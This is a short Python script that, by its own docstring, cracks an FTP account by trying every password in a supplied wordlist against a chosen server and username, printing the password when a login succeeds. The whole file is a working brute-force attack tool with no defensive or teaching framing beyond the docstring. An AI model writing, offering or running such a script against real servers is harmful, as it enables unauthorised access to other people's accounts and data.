""" A Python script that attempts to crack a FTP login and password using a specified wordlist -
The script loops through the linked wordlist one at a time. Attempting each password untill it is either sucessful
or runs out of passwords to try"""

import ftplib

ftp_server = input("FTP Server: ")

username = input("username: ")

wordlist = input("Path to Password List : ")

try:
    with open(wordlist, "r") as pw:
        for word in pw:
            word = word.strip('\r\n')
            try:
                ftp = ftplib.FTP(ftp_server)
                ftp.login(username, word)
                print("[+] Success! The password is: " + str(word))
            except ftplib.error_perm as exc:
                print("Still attempting login...", exc)
except Exception as exc:
    print("Wordlist error: ", exc)
                